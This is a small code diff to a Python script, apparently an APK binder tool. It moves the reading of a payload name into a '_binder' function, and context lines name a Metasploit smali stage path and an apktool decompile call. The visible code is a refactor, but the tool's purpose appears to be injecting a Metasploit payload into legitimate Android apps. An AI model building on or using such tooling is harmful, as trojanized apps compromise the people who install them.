@@ -38,13 +38,12 @@ meta2 = out2 + '/smali/com/metasploit/stage/'
 NPAY = tmp + 'nampay.txt'
 
 
-fname = open(NPAY)
-data_nam = fname.read()
-nam_pay = data_nam.split('\n', 1)[0]
-CLS_RN = os.path.splitext("{0}".format(nam_pay))[0]
-
-
 def _binder():
+    global CLS_RN, nam_pay, fname
+    fname = open(NPAY)
+    data_nam = fname.read()
+    nam_pay = data_nam.split('\n', 1)[0]
+    CLS_RN = os.path.splitext("{0}".format(nam_pay))[0]
     subprocess.call(
         'apktool -f d ' + ORGN + ' -o ' + out1,
         shell=True)
